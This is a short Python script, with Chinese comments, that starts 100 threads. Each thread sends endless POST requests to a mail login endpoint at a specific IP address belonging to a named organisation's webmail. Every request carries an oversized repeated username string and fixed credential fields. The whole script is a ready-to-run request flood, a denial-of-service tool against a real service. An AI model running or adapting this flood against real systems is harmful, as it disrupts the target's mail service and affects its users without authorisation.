from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

import requests

url = "http://112.124.67.183:8088/wiscom/mail/login"

# 定义表单数据
form_data = {
    'fingerprint_deviceid': 'd978bb5777d750f61b94f7147adccce3',
    'device_type': 'web',
    'device_name': 'edge',
    'sid': '',
    'uin': 'wiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwisc'
           'omwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwis'
           'comwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwisc'
           'omwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscom@wiscom.com.cn' + str(datetime.now()),
    'domain': 'wiscom.com.cn',
    'aliastype': 'other',
    'errtemplate': 'logindomain',
    'firstlogin': 'false',
    'f': 'html',
    'p1': 'Bv7zguKiuiJX1oJL+kiZbMaFutPmFvlfopkP2BrBYPTpQyH/VmT+vYxeP1fM9IozQ3rvH4Eu+g274lmvUWmHUJQc6rUSuPokkjEyJduyJl142+3TzGAcUROYgqiHh6mGj1dtmewM/gJOg3qmPLS90hVv5rg9k+sxVq6nj3anOuA=',
    'p': '121aec6581925db01a4c6d1a75e700f457cc97c0e2ab783e12ad33e8b37180ef821c286fa8a68a2d10af626f62c65cdd81cc01b0beb543eeb8d3953f634c1f25b4211fc10231309572e436c4be3242d5d592e27420a65f5fc4de42350e8f34cdbe58e94edfd1cc27fa817c4a',
    'delegate_url': '',
    'ppp': '',
    'ts': '1704331651',
    'chg': '0',
    'fun': '',
    'vt': '',
    'inputuin': '',
    'wx_login_code': '',
    't': '',
    'ef': '',
    'login_from': 'mail_login_wiscom.com.cn',
    'qquin': 'wiscom',
    'pp': '',
    'verifycode': '',
    'area': '',
    'mobile': '',
    'sms_token': ''
}


# 定义发送请求的函数
def send_request(url, form_data):
    while True:
        response = requests.post(url, data=form_data)
        print(response.status_code)


# 使用ThreadPoolExecutor创建线程池
with ThreadPoolExecutor(max_workers=100) as executor:
    # 启动多个线程同时发送请求
    for _ in range(100):  # 这里设置为5个线程，您可以根据需求调整
        executor.submit(send_request, url, form_data)
